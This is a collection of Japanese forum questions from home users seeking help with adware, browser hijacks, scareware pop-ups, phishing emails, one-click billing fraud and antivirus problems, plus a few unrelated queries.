下記は何の同窓会かわからぬゆえ3回も尋ねたが返事が無いので 詐欺メールかと思い伺います。 DOUSOUKAI2015@DOUSOUKAIMAIL.COM 訂正：誤りがありました ＜同窓会＞…ボタンに成っており押すと書きが出る： ERROR: THE REQUESTED URL COULD NOT BE RETRIEVED ごめんなさい。当日は集合せずにそのまま各自会場に向かう事になりました。 車で来る場合はなるべく早めに教えて下さい。 同窓会の場所や詳細の確認がまだ出来ていない場合は、同窓会の詳細を確認してから明日までに参加可能か返信をお願いします。
現在は、たまにメールを確認する以外 使っていないWindowsのノートパソコンがあります。 そのパソコンが、もうすぐウイルスバスターの期限切れになります。 メールも、今は殆ど使っていないアドレスなので（ネットショップのお知らせとか、たまに昔の知り合いからくる事がある程度。）このまま期限切れでもいいかな、と思っているのですが インターネットをしなければ、ウイルス対策ソフトがなくても大丈夫でしょうか？ メールだけでも対策ソフトは必要でしょうか…？ パソコン周りの事は不得手な為、質問がおかしかったらすみません。。 よろしくお願いいたします。
パソコンを開いたら「WinZip Registry Optimizer」というサイトが、いきなり現れ、「レジストリーエラーが570個残っています。エラーの修復をお願いします」、「今すぐスキャンを開始する」と表示しています。とりあえず×をクリックして、教えてグーにこの質問を書いています。詳しい方、対処の方法をご教示ください。
今日、三栄書房経由から迷惑メールが届きました。 HPで注意喚起をしていることを、メールファイルを開けた後に知りました。ファイルはカスペルスキーでスキャンを書けた後で開けたのですけど、かなり後悔しております。 .docの拡張子でした。 中身は真っ白で何も書いてありませんでした。 その後、カスペルスキーで完全スキャンをかけても何も検知しませんでしたので、ひとまずは安心してもいいものなのでしょうか？ Word自体、最近は「実行しようとしている機能には、マクロまたはマクロ言語のサポートを必要とするコンテンツが含まれています。」のようなエラーが発生しているというのに……。 基本的には一太郎のソフトを使用しているので放置しております。
この前間違えて有料のエロサイトにクリックしてしまったら勝手に登録されてしまいました。そして、お金を請求されてしまい、私は焦ってそのサイトに書いてあったお問い合わせの所に電話をかけてしまいました。その場合はどうすれば良いですか？？早急に回答お願いします。
ローマ字入力が英数になる
AVIRA 2015フリー版でスキャン設定の予約時間にスキャンを開始しません。PCを起動時なら問題なく開始するのですがOFF時にもスキャンする設定はないのでしょうか?前は勝手にやっていたと思うのですが再インストールしてからおかしくなりました。
起動するたびに「c:\users\user\AppData\Local\webbus\bin\webbus.dllを開始中にエラーが発生しました。指定したモジュールが見つかりません。」と表示が出ます。表示を出なくするにはどうしたら良いのでしょうか？ちなみにウィンドウズ８，１です。
IEを開くとsnap.doにリダイレクトされてしまいます。 ググって削除を試みましたが私のPCの場合は プログラムのアンインストール画面にもプロセス一覧にもアドオン一覧にも出てきません。 もう諦めつつも何かのヒントを期待して「IEのアイコンを右クリック＞ショートカットタブ＞リンク先」を確認すると 「"C:\Program Files\Internet Explorer\iexplore.exe" %SNP%」と書かれていることに気付きました。 試しにこの「%SNP%」を消すとsnap.doにはリダイレクトされません。 ということはこの起動オプションらしきものがsnap.doのURLが書かれているどこかのファイルにアクセスしているのではないかと考えました。 この「%SNP%」の意味を教えて下さい。 よろしくお願いします。
最近twitterやyoutubeやFacebookやブラウザなど何をするときにも画像のような広告が出てきてイライラします 消し方が分かる方居ましたら教えて下さい(_ _)
今日DMMやAｍazonを見ていたら画像のようなものが上下に出てきました。これの消し方を教えてください windows7/googlechrome最新版
ads by top deal というところから頻繁に「あなたのコンピュータは危険です。削除するソフトをインストールしてください」というwebが来ます。削除する方法教えてください。 windows vistaでmcafeeはインストールしております。
質問させて頂きます。 .htaccessで拒否したいIPアドレスの設定とスパム対策の設定をしたいのですが記述の仕方がよく分かりません。 検索して調べたのですが専門的すぎてよく分かりませんでした。 以下のように複数の項目でallow from all　や deny from 〇〇が記述されていてもちゃんと反映されるでしょうか？それとも記述の順番などのルールがあるのでしょうか？よろしければアドバイスお願いします。 # IP拒否リスト Order allow,deny allow from all deny from 〇〇.〇〇○.○○.○ deny from 〇〇.〇〇○.○○.○ deny from 〇〇.〇〇○.○○.○ # IP拒否リスト END # スパム対策 SetEnvIfNoCase Referer 〇〇○.com spammer=yes SetEnvIfNoCase Referer 〇〇○.com spammer=yes SetEnvIfNoCase Referer 〇〇○.com spammer=yes Order allow,deny Allow from all Deny from env=spammer # スパム対策　end
最近どうもネットストーカーの被害に遭っていて、知らないうちに 変なものがインストールされていたりメールが勝手に開けられたり どう考えても明らかにおかしいのですが警察に何度か相談しても やる気がなさそうで適当に話を聞いてセキュリティソフトを入れてみてはどうですか？とか 初期化したら大丈夫です。とか その程度の応対しかしてくれません(どちらも相談前に試しましたが何の意味もありませんでした)。 まあ・・・幸か不幸か金銭的な被害はいまだに起きてはいません。しかし こなした仕事の内容が勝手に改ざんされたりまるっきり削除されたりと しゃれにならないことばかり起きます。 PCを初期化しても無駄でした。どうすればいいんでしょうね？本当に・・・
ヤフージャパンがスパイウェアだか何だかの方法で 国民のPCやスマホに不正アクセスして中身をのぞいたり インターネット上での行動を監視したり データをいじったり盗んだりしているという噂を聞きました。 これって本当でしょうか？ もし本当なら怖いですね・・・ 対処法とかあるんでしょうか？
いったい何だと思われますか？ ＯＳ＝Win7 premiam Google Chorome （ＩＥ１１が入っていますが使っていません） 前提：よくフリーズするのでフルスキャンしたところ、下記のモノが入っていたとレポートされました。「ウィルス」ではなく「web脅威」と分類されていました。 ちなみにセキュリティーソフトは、ＮＴＴ西日本の光回線「隼」に付帯しているトレンドマイクロのものです。 不思議な点：削除して再起動するといったんはよくなるのですが、一旦シャットオフしたあと、同じ日の数時間後に起動して使い始めていると、また動きがとろくなりカクカクし始め、やがてフリーズすると言う現象が再発します。 そして、この長ったらしいＵＲＬのモノは、削除したにも拘らず、再び復活してきているようなのです。 また、ＵＲＬっぽい文字列なのですが、クリックしても開きませんし、サイトとかに行けません。 回答・お考えをお聞かせいただきたいこと：　 　１．これはいったいなんなのでしょう？　 　２．フリーズの原因と関係あると思われますか？ 　３．これへの対処法（セキュリティーソフトで「削除」したあと二度と入って来れないようにする方法）は？ 以下に「web脅威」と検出された文字列を書きます。長いです。よろしくお願い致します！ http://us.wa.ui-portal.com/1and1/mailcom/s?homep …
不正なアクセスによる遠隔操作やデータ抜き取りの原因になっているマルウェアは やはり人の目では判別・削除できないものでしょうか？
購入・諸々の設定してすぐに有料の信頼できるセキュリティソフトをPCに入れて 一般的にマルウェアが感染する疑いが濃厚なプロセスを極力避けても 利用しているネットワーク自体を狙われた場合、可能ならば悪意のある第3者に こっそりマルウェアをインストールさせられたりするケースってあるんでしょうか・・・
パソコンにマルウェアが感染して初期化するしか解決策がない場合 パソコンのデータは諦めるしかないのでしょうか？ 例えば、外付けHDDなどにバックアップをとっておいて 初期化したPCに真っ先に信頼できるセキュリティソフトをインストールした後、 バックアップデータをPCに入れるのは再感染の可能性を考慮するとやはり危険ですか？
windows 7 の 64bit を使っています。 2か月程前から、インターネット接続時にマルウェアが原因と思われるポップアップが表示されるようになりました。 ネットで調べ、Malwarebytes Anti-Malware というフリーソフトを使ってのスキャンと、MSEのフルスキャンなどを試したところ、一時的には回復するものの暫く経つと再発してしまいます。 リカバリすることが最も有効であるとは思うのですが、諸事情により実施は難しい状況です。 何かほかに、マルウェアに有効な対処方法はないでしょうか。 何かご存知の方がいれば、教えてください。よろしくお願いいたします。
[url]http://sakujosuru.jp/guides/delta-homes[/url]
この前、お恥ずかしながら ワンクリックウェアに感染してしまいました。どうやら HTAファイルを悪用したものでした。幸いにも駆除に成功しましたが、IEのセキュリティーをどのように設定したら 今後 感染を予防できるでしょうか？
私は老年者で　ドラゴンクエストなど全く知らないのですが メールでドラゴンクエストのアカウント確認お願いと来ますが 迷惑メールで処理していたため　今になって気付くと相当数毎日同じ表題で 来ていました 不特定多数に送信しているようだが　真のドラゴンクエスト使用者が メール開封しても大丈夫でしょうか　私は無関係で開封必要ありません
このソフトはインストールして、プロテクトしてもらう内容を設定しただけで守られていることになりますか？ スタートアップなども設定する必要はありますか？ フリーソフトＡＶＧと競合することは考えられますか？
ワンクリックウェアを駆除したいです。 タスクマネージャーを開いたら、mshtaというアプリのレジストリーが書き換えれたようですが、 それ以降のことは分かりません。 どなたか、駆除の仕方を教えてください。ちなみに 使用機種は Windows8.1です。
最近NTT西日本の見張り番に入りました。インストールして何がなんだか分かりませんが、一番分からないのがアドオンを有効にするかとゆうことです。隠れているインジケーターを見ると稼働しているみたいですけどなんだかよく分かりません。詳しい方教えて下さい。よろしくお願いします。
このように、サイトを開くたびにえげつない数の広告が出てきます。 プログラムと機能にも、reimageとかはありません。とりあえずタスクマネージャから怪しいものは削除しました。ですが変わりはありません。たまにDMMのアダルトサイトとか開くのでやめてほしいです。また、空白のところをクリックしただけで、Reimageのサイトが開きます。 ウイルス駆除ソフトとかは使いたくないです。解決方法を教えてください！
先日からweb画面にやたらと広告が出ます。 internet programなどの記載があるもので、違うところをクリックしても強引に他のページに連れて行かれます。 windows7なのですが、心当たりのある（広告が現れた）日のインストールは日付ですべて削除しました。ad creanerやspybotを使ってみてもだめ、ウイルスバスタークラウドでも検知できず、ノートンを入れてみましたが消えません... その日から設定がgoogleにも関わらず、トップページ（ホームページ）が英語版yahooになったり。。。アドウェアの消し方ご存じの方いませんか？ やはり初期化しかないですか、、
OS Windows7 ブラウザ Firefoxだけです、Internet Explorerでは問題ないです 価格.com商品ページ http://kakaku.com/item/K0000566227/ 価格.com、Amazonなど商品画像にマウスポイントを置くと、 「See More」と出て画面が薄暗く成り、別の商品画像が出ます。 解決の方法を教えて下さい。
迷惑メールの質問です。メールの題名に　「これ貴方の顔写真ですよね？」というメールが　プロバイダーのwebメールに届きました。ドメインは　@c6-nt6y7b6.click　になっています。 開いてみようと思ったのですが、まだ開いていません。このメールは危険な物でしょうか？ webメールで開いてしまうだけでも　ウイルスに感染してしまいますでしょうか？ このメールについて詳細を知っている人がいましたら教えて下さい その他、健康診断の結果、不在届のお知らせ、写真だけで満足ですか？・・・や 同窓会のお知らせ等のメールが届く時もあり、困っています
パソコンを使用中にAVGの常駐シールドが出てきました。 GoogleCrashHandler.exeにアドウェアが検出されたみたいです。 削除しないとまずいですよね？ 選択で ファイルへ進む 脅威を無視する の二択なんですがそうしたら良いのでしょうか？ ファイルへ進むを選択したあとの動作がわかりません。 わかる方がいらっしゃいましたら教えてください。 使用しているOSはWindows 7です。 他に必要な情報がありましたら言ってくださると助かります。
最近pcがおかしいくて、危険なものが入ってそうなのです。 自分でよく探したのですがわからなく困っております。 PCは苦手なもので...お願いします、助けてください。
ポップアップウインドウが、ＩＥのツールでは消えません。 削除方法フリーソフト（日本語版）を教えてください。
しょっちゅうこんな広告が勝手に出てきて困ります。 調べてみたのですが、これはスパイウェアのかもということがわかりました。 対処方法も調べたのですがよくわかりません。 わかりやすく教えてください。 よろしくお願いいたします。
再質問になります。推測なんですが、どうも私のノートパソコンから大量の送信が行われた感じです、このため、ネットをできない様にして更にメルアドを廃止しました。ウィルス対策にはバスターを入れていましたが、今はネット接続できないためマイクロソフト セキュリティでチェックしました（何も検出されず）。しかし今後ネット接続したいと思うのですが、接続してもう一度バスターでスキャンしてもムダでしょうか、メルアド廃止しても何ら意味は無いのか、教えて下さい。
http://www.vector.co.jp/soft/dl/winnt/util/se492 … このソフトがESET NOD32がこのソフトのexeファイルを隔離してしまい使用できません。 復元してもすぐに隔離されてしまうのでUnlockerが使えずに困っています。 どうすればこれを使えるようになりますか？
さっき美味しい天ぷらというアカウントでスパイウェアに関する質問を投稿したのですが・・・ そっちでも記述している通り、以前からIE11のクッキーを勝手に無効にされたり ウインドウが勝手に消えたり、２つあるうち普段使わないグーグルアカウントのほうに 知らないうちにログインしていたりメモ紙というフリーソフトを初めて起動した時に 出てくるウインドウを「次回からこのウインドウを表示しない」というチェックボックスに チェックを入れて表示しないようにしたのにまた表示されたりと 気持ち悪い現象に悩まされていました。 なぜ別アカウントでまた質問を投稿したかというと、 古いアカウントで上記のような質問を投稿していてもたってもいられずもう一度 オンラインスキャンをしていたのですが、そのスキャンが終わって結果を見ようとしたら ウインドウが何やら真っ白で何も見えず。なにこれ？と思ってクリックしたりしていると PCがフリーズ。十数分経っても何も起こらないので仕方なく強制終了、再起動して もう一度ここに来ると何故かログアウトしていました。ログインしようとしてもできず、 しょうがなく今の別アカウントを取って質問を再投稿した次第です・・・ この一連のことからやはりスパイウェアでこちらの行動を監視・PCの遠隔操作を 何者かが行っていると確信しました。しかし今までフリーですがウイルスバスターを使ったり いろいろな試みをしてみましたが全然効果がありません。 ウイルス対策ソフトは製品版を購入しないとやはり意味がないのでしょうか。 それとも一度この手のものに感染してしまったらもうどうすることもできないのでしょうか・・・ 気持ち悪くてしょうがないです。一体どうすればいいのでしょう？？
楽天やポイントサイトの、無料の広告宣伝と思いますが、「パソコンが壊れています？・動作が遅くないですか？などと宣伝して無料で対応しますなどと書かれていますが。実際は有料で対応になります。 これは詐欺のようなものでは？」広告宣伝が動き目障りで見たいものまでみられなくなります。 楽天には問い合わせしましたが、楽天も困っているとのことで？対応はなしです。 実例　relmage.com Reimage Repair これは信用するほうが可笑しいと思いますが、この迷惑な会社はどうなんですか？
どなたか詳しい方、ご返答よろしくお願いします・・・ ちょっと前からいくつかのサイトで自動ログインが解除される現象が起こっています。 それは一部のサイトのみ集中的に起こり、 いくら自動ログイン設定してもまた元通りになります。 しかも奇妙なのは、もう一部のサイトだけ自動ログインが外されないことです。 なんだか人為的なものに感じ、ウイルス除去などを試してみましたが一向に効果はありません。 これはハッキングされていると考えるべきなのでしょうか？ こういった場合、何か対策などはありますでしょうか？？ どなたかご回答よろしくお願いしますm(_ _)m
大学生の姪が利用するパソコンの件です（Mac Air） 2014年3月、中国に4か月留学することになり、新しくパソコンを購入しました。 その際はウィルス対策ソフトは入れてませんでした。 中国ではWi-fi環境でインターネット利用していたようです。 留学から戻り、大学でインターネット利用するためには「ウィルス対策ソフト」をインストールしていないとダメだということで、「ウィルスバスター」をインストールしました。 その後、インターネット利用すると、ウィルスバスターが「webサイトをブロックされました」と 「http://s.trk-u.com/?cb=・・・・」という表示が出てきたようです。 ネットで検索すると、日本語での結果は出てきませんでした。 たぶん、中国で何かインストールしてしまったけど、これまでウィルス対策ソフトがなかったので気づかなかったのかな？と勝手に想像しています。 とりあえず何とかこの「s.trk・・・」という何かソフトをアンインストールしたいと思うのですが、姪から相談されましたが、私はMacはこれまで使ったことがなく、良くわかりません。 ＜質問＞ ソフトのアンインストール方法を教えていただきたいと思います。 ＜質問＞ Windowsで言う、「プログラムの追加と削除」を確認したいと思うのですが手順を教えていただきたいと思います。 よろしくお願いいたします。
windows 7, ie 11です。 窓の杜からAD AWAREのセキュリティをインストしたのですがネットが重くなったりしたので 削除しましたがタスクバーにアイコンが残っておりクリックしますと起動します。リカバリーをすると リカバリーできないと云うウインドーが出ます。このフリーソフトad awareはインチキでしょうか？ また完全に削除するにはどうしたらいいですか？ http://www.forest.impress.co.jp/library/software …
アンインストのソフトを使いますがwindowsが機能しなくなり削除の邪魔をします。 どなたか御教授下さい。 以下のサイトは信頼できますか？ http://ja.howdoiremoveit.com/adware/cinema-video …
yahoo japanのニュースの項目の一つをクリックしますと上記の小さなウインドーが画面中央に出ます。このウインドー以外のどのクリック場所をクリックしても作動しなくなります。スパムアプリを作動させるつもりでしょうがニュース項目に添付しニュースが読めない状態です。このニュースを見るにはどうしたらいいですか？またこのスパムアプリの出所はどこでしょうか？
クッキーモンスターというやつとビスケットというやつを使っていますがこれらのアドオンでブロックしてもクッキーが入ってきますどうしてでしょうか？ ライブドアブログやロハコはIPをクッキーに入れてきて気持ち悪いのでどうにかしたいです
Roll　Around　というプログラムがインストールされていて なんか、怪しいです。 コントロールパネルから、削除できません。 対策を教えて下さい。 添付図は、コントロールパネルでの　Roll　Around　表示です。 コントロールパネルで、削除出来ないとなると、どうすればいいのか・・・ 皆様、お願いします。
windows 7, ie 11です。セキュリティはking softです。 上記のスパムプログラムをブロックする方法はありませんか？またやられました。今度はadobe flash playerの更新という知らせでadobeの見慣れたログに騙されました。
NTT西日本のTRENDMICROに入っていますが、他にもスパイウェアとアドウェア対策を入れたほうがいいでしょうか？ 今、Spybot-S&D Start CenterとSpywareBlasterとadwcleaner_4.110 とMalwarebytes Anti-Malwareをパソコンに入れて毎日更新とスキャンをしております。 ですが更新とスキャンが流石に面倒なので・・・どれかアンインストールしようか悩んでおります。 全部していたほうがいいのか？ どうなのか？ 気になるので教えてください。
間違えてアダルトサイトをクリックしてしまい。 「登録が完了しました。」となり３０秒ごとにＰＣにアダルトサイトの画面が表示されます。 ×で消せるのですが、３０秒後に又でてきます。 内容を読むと「お客様のＩＤ番号で入金が確認されるとこの画面は表示されません」と書いてあります。 ウイルスセキュリティーソフトで完全スキャンをやりましたが、消えません。 この画面を消す方法はないのでしょうか？ 宜しくお願いします。
UUUMに入りたいです！！入っている方おしえてください！！
500 Internal Server Error Sorry, something went wrong. A team of highly trained monkeys has been dispatched to deal with this situation. If you see them, show them this information: AB38WEMvNVITqUYV3L34W3k7Co5-uhUtTIrBsqq2RDe2DgkLr3FWf8SfGYXZ V-ssTD0L4uJ4y6wKfM9bQfJwJTd2Yi0BiUoG7zg0sI9gBU6qVKMeXAtClno4 eRnvoIcFbVC5JMvTSeVGHgM_StGwtJhgHCyy_UpTJgVS2b-QweGh9WnthjLS nFCnCR6I4N5OBHT8ptaTwOTyTUCzoXALgKAyCDKDthSrrWoy_zwr950sdW-g OoDIE2fCr2dH2qKkXfZ9o-XcpVPSJC_2Jlt0mP0mY14XB_bzHWpaq4f4i8I9 mZKY8R8SMuGrm1hrRJMTQjMexWnuhv_BcDrNVZODLnvhWXvKiofZV34PjxG- hoSOjLm6Y14rCM2E1uZdYDThy4NAeyLg93QPHgvK2BSsWxqoFujcadenGgsL OhqJB2whirk_6s-izGD7B-cPxUcet2GJ5sFM8fC2UouMNl0doD2mkouZreO8 OTgptvwjtcRo7HrqmJ7yMHBBV1FriPubpSbzCDh0smqIvqsf7kgvdHF9ZjLQ lO3fDIwGsscFFQR_gu09UUFE-P0jtHT01oTjGLCvl8qy3ff8_7aGPM6WJy8D j61lH8owHyjnTxFf_Jas-JmxOuFBCYuEJRrrbpMRWaYMza_FwRlPEEQx1xza J1LTRbnFgMzIJDEn3n74FoF8TEsW1ZC9HfElXKMrsfOIAMBHBrzMVhE-_4iz ZB0SCvve45Pl_npAKQ-JZc81xF-TfMjoufiTscZhQ6mPYraMRilPzGfsLc1l PQA-H0DpVKgWz4kepbdZlmxJlMgP28u7R9LwhDx7qnYLxBfx6ZPTrKxlwxAq InsDcM0InrxH1Qt6zFNDE-kJy6YDnNhcTR3xT48Frl-Z-YvthyhVLLLqB39O IdmLcK6LIfnhNjWJKAMfM3jfvRMZYVwNCzLMaAhfLNbGZJ29Dh8G-u5gBIU9 dVBPnruuJCfx6IF4rIuIrERwKyWifJt6bgqjcq8ahI0BAfn_Io3fCa2fJID7 AVEzBcnw-WCPeOqltxhyF3Fawcai32rA7nrO7qnJoNYhPAWFQic6kU-3nDDQ q4w1hgSCCnMCOYMMu_iBgV6KJdKKfgkEhReP7NMEf6p6BnUQTGTpA6tKBh2d qVFCH8lVhtVDFF-nY_htxqPEFFUA036W9knclOaiGZs-eAd2PzYrGkT-lv0t ebiq-rZxSpszKRnpmw_WeDPMWbzQu4UgJa5dQBfuA_HnBnz2QY0a9CgaM1-c 4UI-cIUEizUe0y2iwx_5V8zeKe8hGDhEgraEBSps6bdihDd_1mIp9mEAakqL RVqROq5mzWHbKqvHrAVZfBNrvrAzUKTuzF7UAzMSIlk2o_QV3OWg344aMehs M-i8aNgYTUob5quRWNA_vqn7LXSE36bintuHeuYQYeD3qlPQhCFmpKHppE7g QIOhtbj0RoimdTCzbIHPVkyqfkHt-pbke7RhXwEEJEOo-5c1MrUwoxv2F-iF IrsAYG11-IwkIK0F5LjaPz78RzscoBHBSjnjXZh6EUCP6YAV32SbWpBCp6LQ olvWrC4VvWD3vo17jFWw-diC_CTp_qgZDJii03HBLyDmWqEQ9Fe0cHDWNwfc 6-Jly-5ZXN_wHSshLpdTTSR4S4XPh1dZRv-91a72I7BhtMfB7FMXsE6MudJE 1z4Q_DjNWnpUSC7Pb6BGYyoVsyT67MrmRmRM5uA6SJMWtME-2pVaV9lQJ-ds YVjS9Kpz3TtdTDZqUw6AJrIRTKYZrafgztnhTiyaXhOHVk9N31yCfeTuQHO1 tBPJa1_SP6HlSPK-kavIWKKfAXQnhjHJnpEOV8ZI7TJsE2dQx-5y4bQDYf0O utqt930_zkOCFk4gPBc-ABa-wA-pl4ySswkV1qoC5TQJFMWYPwSCpsaFfZ9m InIOS6MN27N9 これは一体何ですか。 下をリンクをアクセスした直後に出てきました。 https://www.google.com/url?sa=t&rct=j&q=&esrc=s& …
Firefox(v35.0.1)にてETCマイレージサービスのサイトからログインしようとしたところ、 以下のような警告が表示されました。 　「接続の安全性を確認できません」 　www2.smile-etc.jp は不正なセキュリティ証明書を使用しています。 　発行者の証明書への認証パスが提供されていないためこの証明書は信頼されません。 　(エラーコード: sec_error_unknown_issuer) 他のブラウザでも試したところ、 　Chrome(v40.0.2214.94 m)：この接続ではプライバシーが保護されません 　IE11：警告はなく、ログイン画面が表示される といった結果でした。 数か月前にログインした時はこういった警告はなく、普通に利用できていましたが、 最近はログインしていなかったため、状況がわからず、皆様のPCで問題なく表示できるか 教えていただけないでしょうか？ 他の方もおなじような状況ならば、アクセスを控えて様子見しようと思います。 また、私個人のPCだけの問題のようでしたら、解決策がありましたらお教えください。 環境 OS：Windows7 Ultimate セキュリティソフト：Microsoft Security Essential
ブラウザ　ファイヤーフォックスを本日ダウンロードしたのですが、 広告が非常に多く困ってます。 広告非表示のしかたを教えてください。 よろしくおねがいします。
使用しているセキュリティ対策ツールは「NTT西日本セキュリティ対策ツール」 ログの詳細は ウイルス/脅威: SPYW_BROWSEVIEW 感染ファイル: C:¥Windows¥Temp¥tmp2196vbaaaa 処理: 削除済み スキャンの種類: リアルタイムスキャン このファイルのvbaaaaのvの部分がabaaaa、bbaaaa・・・と20分おきに検出され、今の段階でvまで来ています。 また、こういったログもあります。 ウイルス/脅威: SPYW_BROWSEVIEW 感染ファイル: C:¥Program Files (x86)¥RightsNetwork¥RightsPlugIn¥Trans¥Bin¥BHVProc.swf 処理: 削除済み スキャンの種類: 手動スキャン この増殖は、どうやったら止められるでしょうか。ご回答よろしくお願いします。
最近、パソコンの画面右下にオレンジの音楽のマークが表示されるようになりました。邪魔なので、コントロールパネルからアンインストールしたにも関わらず表示が消えません。再度、コントロールパネルを見ましたがソフトは消えていました。どうすれば消えますか？
ウィルス対策ソフトとして　「McAfeeトータルプロテクション」　を入れています。 ヤフー等の検索サイトから、「Gooバイク」のサイトに移動しようとすると、 　「McAfeeサイトアドバイザー」が立ち上がってしまい、「このページの閲覧は危険を伴う可能性があります。」のメッセージが出てしまいます。 検索でヒットした怪しいサイトではなく、まともなサイトに飛ぼうとしているのに、なぜこのようなショッキングなメッセージが出るのでしょうか？ あるいは、そのサイト運営者も気づかない間に、外部から工作を受けていて、何かウィルスやボットやスパイウェア等が埋め込まれてしまっていて、それをウィルス対策ソフトが検知している、という可能性もあるのでしょうか？
興味本位でダウンロードしたもののインストーラーでインストールしたらいろいろやばいものまできてしまいました。ウィルスバスターなどのものは何もしてないです・・すいません。お願いします助けてください。何をしていいかわからずとりあえずプログラムのアンインストールというところに書かれたウィルスをｄｌした時間のものをあげていきます。 ・MyBestOffersToday 015.244 ・Word Proser 1.10.0.1 ・Remote Desktop Access(VuuPC) ・Super Optimizer v3.2 ・Software Updater ・ConvertAd ・SpeeditUp すべてのプログラムをみると反転した ・Super Optimizer ・VOPackage ・MYBESTOFFERSTODAY もありおそらくこれもそのウィルスとおもいます。 クロームの右上の縮小の左横にウィルスの影響か人型のボタンも加わってます。消したいです。 お願いしますウィルスのなかった状態に戻したらウィルスバスターもして反省します。どうか元の状態になるようお助けください。 windows7です。
アドウェアについて3つほど教えて下さい。 (1) アドウェアに感染している場合はどんなサイトでも必ずそれらしき広告が表示されるのか？ 逆に表示されない場合もあるのか？ (2) まとめサイトといった一般的なサイトなどでそういった広告が見られない場合はアドウェアに感染していないと考えていいのか？ (3) アドウェアに感染していない(一般的なサイトでそういった広告が見られない)場合でも一部のサイトでは表示されることがあるのか？ よろしくお願いします。
ある、サイトを閲覧していたところいきなり、 「少なくともひとつのＣＰＵの100パーセントが使用されました」と出たのですが、 この意味が分かりません。 何がどうしたのでしょうか？ ウィルス対策にはノートンを入れています。
インターネットオプションで、「ヤフー」に設定しているのに、 インターネットエクスプローラを起動すると「グーグル」になって しまいます。スパイウイルスなのでしょうか？ どうしたらいいのでしょうか？
削除方法を検索しますと 【説明に「Search Protect」と書かれてある以下の３つのプロセスを停止させる。 「SPRunner.exe」 「cltmng.exe」 「CltMngSvc.exe」 タスクを右クリックして Windows7の場合は「プロセスの停止」をクリック。 Windows8の場合は「タスクの終了」をクリック。 4.「Search Protect」のアンインストール 「C:\ProgramFiles\SearchProtect\bin」フォルダにある「uninstall.exe」をクリック。 これで「Search Protect」がアンインストールされます。 基本は「C:\ProgramFiles\SearchProtect\bin」にありますが、元のソフトをインストールした場所によっては違うドライブやフォルダにインストールされています。 また「C:\ProgramFiles\SearchProtect」フォルダに別の名前のフォルダがあり、その中に「bin」フォルダがある場合もあります。】 と出ますが探してもこのファイルが無く削除できません。 どなたかわかる方教えて下さい。
Windows８でSpyHunter4がアンインストールできなくて困っています。コントロールパネルからプログラムのアンインストールを行いますがEnigmaソフトウェアの広告ページの有料ページに誘導され拒否するとアンインストールが行われないままになってしまって困っております。誰かわかりやすくアンインストール方法を教えてください。よろしくお願いいたします。
Yahoo画面上部に出る”BuzｚWokを消したいと思い、ググりました。 http://detail.chiebukuro.yahoo.co.jp/qa/question … プログラムの中に「OffersなんとかSystem」というものをアンインストールすれば いいと書いてありますが、何度探しても見当たりません。 怪しいソフトは片っ端からアンインストールしましたが、Snap.do(Resoft.Ltd) Advanced System Protection というのだけアンインストールができません。 これがその元なんでしょうか？　　　良い方法はないでしょうか？
会社の同僚がなぜか私のスマホの書き込みや検索したサイトなどを知っています。私はロックをかけなかったので離れている隙にされた可能性が高いです。モバイルスパイが仕組まれていないか調べる方法、誰がその情報を仕入れているか調べる方法、今後、仕組まれないようにする対策があれば教えてほしいです。変な人に見られていると思うと 不気味で迷惑しています。
先日、aguse.jpのブラックリストに載っているというサイトにアクセスしてしまいました。 (ちなみに、該当していた箇所は「非営利団体SPAMHAUSプロジェクト」のIPアドレスベースの送信者ブラックリストと「民間団体CBL」が公開しているブラックリストの二つ) ただ、この該当箇所の説明を読んで見ても「ブラックリストに載っている」と書いてあるだけで、具体的にどういった危険性があるのか(アクセスしてしまった場合)までは書いておらず…大変不安な気持ちでいます。 aguse.jpに詳しい方、具体的にどういった危険性があるのかわかる方いましたら、回答お願いします。
誰かこの状況わかる人いますか。初めての経験です。 Windowsを起動したらデスクトップのフォルダやらショートカットやらが一掃されてて、セキュリティソフトも落ちた状態で起動もできません。コントロールパネルやらなにやら設定を 変更、システムの復元、 いつも使っているソフトの起動もすることができません。マイコンピュータからCドライブ、Dドライブを確認すると、中身自体は残っているようです。バックアップも取れないのでどうしたらよいか分かりません。今流行りのウイルス？という声も聞きました。知っているかたいらっしゃいましたら解決方法を 教えてください。
Corel WinDVDを起動すると、McAfeeが「侵入がブロックされました」と警告を出します。 プログラム：Windowsホストプロセス（Rundll32） アクティビティ：Buffer_Overflow Corel WinDVDを起動した時にこのようになります（数回試した）。 WinDVDのバージョン：10.0.5.109 WinDVDはVAIO VPCF118FJに付属していたものです。 これはCorel社のソフトウェアの問題で、誤検知ということで認識して良いでしょうか？
ieをつかっていて特定のサイトにアクセスすると ad.yieldmanager.com doubleclick.net ad.turn.com などにつながり表示されなくなりました。 他のブラウザでは問題なかったです。 調べて、インターネットオプションからセキュリティやプライバシーの項目で それらのサイトをブロックする設定にして、cookieの制限を高くしたら解決したのですが これは一体、なにが原因で発生したのでしょうか。 cookieの制限を高くすると、アクセス出来ないサイトがあります。 最近ブラウジングに時間がかかるのもこれが原因なのでしょうか。 セキュリティーソフトはマカフィーを入れています。
大至急、解答お願いしたいです！ウイルス感染でしょうか？ iPhone5sを使用しています。充電コードが壊れたため、今朝コンビニにて充電コードを購入して充電しました。正規品ではなく、車につけて充電できるタイプのものです。1日中ずっとコードをさしっぱなしにしていました。 すると21時半頃に画面を見ると、「このiPhoneを探している方がいます。見つけた方は連絡してください。090********」の文字があり、ロックがかけられ解除できませんでした。パニックになって電話番号を押してしまい、知らない男性が出たのですが、何も知らない様子だったので間違えましたと言いすぐ切りました。それからはiPhoneの電源は切ってあります。 Appleのサービス時間も終わってしまい、専門の相談所もわかりません。私のiPhoneの情報を抜き取られているのではないかと心配でたまりません。どうすればいいのか困っています。このような場合、どうすればいいでしょうか？
YAHOO画面で各種web siteを見ていると「重要なメッセージ、あなたのPCはクラッシュ寸前です。直ちに修正してください。Microsoft Partner」というメッセージが画面上に現れます。なんとなく不気味です。TrendMicroのウイルス対策は実施しており最近の検索では安心です、との報告は受けているのですが。インターネットの立ち上がりは前に比し遅くなっているのは事実なのですが特に不便は感じていません。このようなメッセージへの対応はどうしたら良いのでしょう。詳しい方ご指導願います。
部屋の写真・撮影にしようしたいと考えています。 お手軽なものを探しています。 ご存知のかたお教えください。
パソコンを立ち上げると以下の様な不審な通告が表示されます。 PC Speed Scan ProはあなたのPCに1044個のエラーを検出しました。 これらの有害なエラーを削除することで、あなたのパソコンのスタートアップや動作、または性能を全般を改善できます。 簡単に元のPC性能へ修復しましょう。 　　　　　　　　　　　　　　「今すぐ修復」　　「再スキャン」 不審な通告なので、都度消去していますが、再度通告文が出ないようにする方法を、ご指導下さい。
